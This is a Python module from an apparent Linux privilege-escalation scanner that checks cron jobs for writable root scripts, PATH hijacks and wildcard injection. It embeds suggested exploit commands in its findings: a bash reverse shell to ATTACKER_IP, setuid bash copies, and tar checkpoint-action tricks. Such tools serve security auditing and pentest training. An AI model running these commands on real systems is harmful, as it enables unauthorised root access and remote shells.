"""
Module: Cron Job Vulnerability Scanner
Extracts and analyses system and user cron jobs for privilege escalation paths.

Commands used:
  crontab -l                         → Current user's cron
  cat /etc/crontab                   → System crontab
  ls -la /etc/cron.*                 → Cron directories
  cat /etc/cron.d/*                  → Cron.d entries
  find /var/spool/cron -ls           → User cron spools

Attack vectors:
  1. Writable script executed by root cron      → Replace script
  2. Cron job uses relative path                → PATH hijack
  3. Wildcard in cron command (tar, chown etc.) → Wildcard injection

References:
  https://book.hacktricks.xyz/linux-hardening/privilege-escalation#cron-jobs
  https://www.hackingarticles.in/linux-privilege-escalation-via-cron-jobs/
"""

import subprocess
import os
import re
from modules.banner import Colors, ok, warn, info, finding

# Commands known to be exploitable with wildcards
WILDCARD_EXPLOITABLE = ['tar', 'chown', 'chmod', 'find', 'rsync', 'zip']

CRON_FILES = [
    '/etc/crontab',
    '/etc/cron.d/',
    '/etc/cron.daily/',
    '/etc/cron.hourly/',
    '/etc/cron.monthly/',
    '/etc/cron.weekly/',
    '/var/spool/cron/',
]


class CronScanner:
    def __init__(self):
        self.findings = {}

    def _run(self, cmd, timeout=10):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            return result.stdout.strip()
        except Exception:
            return ""

    def _extract_cron_entries(self):
        """Collect all cron entries from system and user crontabs."""
        entries = []

        # /etc/crontab
        crontab_content = self._run("cat /etc/crontab 2>/dev/null")
        for line in crontab_content.splitlines():
            line = line.strip()
            if line and not line.startswith('#') and len(line.split()) >= 7:
                parts = line.split(None, 6)
                entries.append({
                    'source'  : '/etc/crontab',
                    'schedule': ' '.join(parts[:5]),
                    'user'    : parts[5] if len(parts) > 5 else 'unknown',
                    'command' : parts[6] if len(parts) > 6 else '',
                    'raw'     : line,
                })

        # /etc/cron.d/
        cron_d = self._run("cat /etc/cron.d/* 2>/dev/null")
        for line in cron_d.splitlines():
            line = line.strip()
            if line and not line.startswith('#') and len(line.split()) >= 7:
                parts = line.split(None, 6)
                entries.append({
                    'source'  : '/etc/cron.d/*',
                    'schedule': ' '.join(parts[:5]),
                    'user'    : parts[5] if len(parts) > 5 else 'unknown',
                    'command' : parts[6] if len(parts) > 6 else '',
                    'raw'     : line,
                })

        # User crontab
        user_cron = self._run("crontab -l 2>/dev/null")
        for line in user_cron.splitlines():
            line = line.strip()
            if line and not line.startswith('#') and len(line.split()) >= 5:
                parts = line.split(None, 5)
                entries.append({
                    'source'  : 'user-crontab',
                    'schedule': ' '.join(parts[:5]),
                    'user'    : os.environ.get('USER', 'current'),
                    'command' : parts[5] if len(parts) > 5 else '',
                    'raw'     : line,
                })

        # Cron scripts in directories
        for cron_dir in ['/etc/cron.daily', '/etc/cron.hourly', '/etc/cron.monthly', '/etc/cron.weekly']:
            if os.path.isdir(cron_dir):
                for script in os.listdir(cron_dir):
                    spath = os.path.join(cron_dir, script)
                    entries.append({
                        'source'  : cron_dir,
                        'schedule': f'({os.path.basename(cron_dir)})',
                        'user'    : 'root',
                        'command' : spath,
                        'raw'     : spath,
                    })

        return entries

    def _analyse_entry(self, entry):
        """Analyse a cron entry for vulnerabilities."""
        issues = []
        cmd   = entry.get('command', '')
        user  = entry.get('user', '')

        if not cmd or user not in ('root', ''):
            return issues

        # Extract script/binary path
        tokens = cmd.split()
        for token in tokens:
            if token.startswith('/'):
                # Check if the script is world-writable
                if os.path.isfile(token) and os.access(token, os.W_OK):
                    issues.append({
                        'severity'   : 'CRITICAL',
                        'type'       : 'Writable cron script',
                        'detail'     : f"Root runs {token} which is writable by current user!",
                        'exploit'    : f"echo '#!/bin/bash\\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > {token}",
                    })
                # Check parent directory writable
                parent = os.path.dirname(token)
                if os.path.isdir(parent) and os.access(parent, os.W_OK):
                    issues.append({
                        'severity': 'HIGH',
                        'type'    : 'Writable cron directory',
                        'detail'  : f"Parent dir {parent} is writable → can replace {token}",
                        'exploit' : f"cp /bin/bash {token}; chmod +s {token}",
                    })

        # PATH hijack via relative binary in cron
        for token in tokens:
            if token and not token.startswith('/') and not token.startswith('$') \
               and not token.startswith('#') and len(token) > 1 \
               and re.match(r'^[a-zA-Z]', token):
                issues.append({
                    'severity': 'MEDIUM',
                    'type'    : 'Relative path in cron',
                    'detail'  : f"Cron uses '{token}' without absolute path → PATH hijack",
                    'exploit' : f"echo '#!/bin/bash\\nchmod +s /bin/bash' > /tmp/{token}; export PATH=/tmp:$PATH",
                })
                break

        # Wildcard injection
        if '*' in cmd:
            for wc_cmd in WILDCARD_EXPLOITABLE:
                if wc_cmd in cmd:
                    issues.append({
                        'severity': 'HIGH',
                        'type'    : 'Wildcard injection',
                        'detail'  : f"'{wc_cmd}' with wildcard in cron → Wildcard injection possible",
                        'exploit' : f"Create files: --checkpoint=1 --checkpoint-action=exec=sh shell.sh",
                    })

        return issues

    def scan(self):
        data = {
            'entries'       : [],
            'vulnerabilities': [],
        }

        entries = self._extract_cron_entries()
        data['entries'] = entries

        for entry in entries:
            issues = self._analyse_entry(entry)
            for issue in issues:
                issue['cron_entry'] = entry['raw']
                issue['source']     = entry['source']
                data['vulnerabilities'].append(issue)

        self.findings = data
        return self.findings

    def display(self):
        d = self.findings
        info(f"Total cron entries found: {len(d['entries'])}")

        if d['vulnerabilities']:
            print(f"\n  {Colors.RED}{Colors.BOLD}⚠  CRON JOB VULNERABILITIES:{Colors.RESET}")
            for v in d['vulnerabilities']:
                finding(v['severity'], f"[{v['type']}] {v['detail']}")
                print(f"           {Colors.YELLOW}Exploit → {v['exploit']}{Colors.RESET}")
                print(f"           {Colors.WHITE}Cron entry: {v['cron_entry']}{Colors.RESET}")
                print(f"           {Colors.CYAN}Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#cron-jobs{Colors.RESET}")
        else:
            ok("No exploitable cron jobs found")

        # Show all root cron entries for review
        print(f"\n  {Colors.CYAN}Root cron entries (for manual review):{Colors.RESET}")
        shown = 0
        for e in d['entries']:
            if e.get('user') in ('root', '') and shown < 10:
                info(f"[{e['source']}] {e['raw']}")
                shown += 1
        if not shown:
            ok("No root cron entries detected")